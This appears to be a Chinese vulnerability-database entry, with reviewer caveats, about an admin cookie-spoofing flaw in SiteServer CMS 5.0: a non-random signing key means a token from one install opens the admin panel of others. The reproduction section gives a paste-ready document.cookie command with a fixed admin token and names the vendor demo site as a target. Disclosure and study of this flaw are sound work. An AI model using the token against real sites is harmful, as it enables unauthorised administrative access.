---
source: "hatch 补库批 20260928"
product: "SiteServerCMS5.0"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "SiteServer CMS 5.0 管理后台Cookie欺骗"
prerequisites: "来源所述条件，未列明部分仍待核：同版本共享签名/加密key、有效可重放管理员token、用户标识/过期策略兼容"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0199a8b055746fce42a32909"
entity_id: "ve-0199a8b055746fce42a32909"
schema_version: "1"
---

## 核对与使用边界

- 样例保留边界：原 Cookie 值属于正文“固定密钥导致跨实例 Cookie 复用”的核心技术示例，未把它当作已验证有效的真实会话秘密而删改；其来源和是否确由公开默认密钥产生仍待原稿/源码核对。保留该字符串不表示它现在可登录任何实例。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：同版本共享签名/加密key、有效可重放管理员token、用户标识/过期策略兼容

- **结论使用边界（1）**：称JWT但示例并非可见三段格式，需要实际token封装/算法源码核实。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（2）**：所有同版本Cookie通用与以下PoC直接可用忽略账号/时间等限制；只单官方演示站描述无对照。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **凭据与会话边界（3）**：token是历史认证数据不应保留作为活跃凭据示例；无原始来源/补丁/密钥生成逻辑。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# SiteServer CMS 5.0 管理后台Cookie欺骗

一、漏洞简介
------------

SiteServer CMS 5.0
后台访问控制采用JWT技术进行身份鉴别，HTTP请求时通过Cookie中的ss\_administrator\_access\_token字段值作为身份鉴别，而加密ss\_administrator\_access\_token字段值的key在安装时未进行随机初始化，导致所有相同版本的应用系统Cookie可以通用,通过修改Cookie可登陆任意相同版本后台。

二、漏洞影响
------------

SiteServer CMS 5.0

三、复现过程
------------

系统环境：IIS 7.5 + MSSQL 2008 R2 （操作系统：Windows Server 2008 R2）

先访问一个站点，以官方体验站点为例子：

http://cms.demo.siteserver.cn/siteserver/login.aspx

Chrome浏览器按F12切换到控制台，设置ss\_administrator\_access\_token的Cookie值（以下PoC可以直接使用）：

    document.cookie='ss_administrator_access_token=M3ENIa3NKJJ39JCRHnY4PgfJqMC7lFjggL0e9S06Bs9ubZE90add0xM2aesaL0add0Cxo8Xe5VZrSanerzFU8oZaMXCC9AoJfZvq5AtBXGxi0slash0tCRtk8UgV5UXu1u2pDL6htbwIqGBZx0slash0ZqVH4x0LjRE20slash0mz3FHc5QJFpTAKI0slash0AJ52LJ6XnWB7gsJuHFauL0add0q0add0sIMft8e3ef840gWzQaChpfGHfYwGS5wHFaC19T56X2J0Z5Hn500equals0'

再次访问（后面没有login.aspx）：

http://cms.demo.siteserver.cn/siteserver/

登陆成功
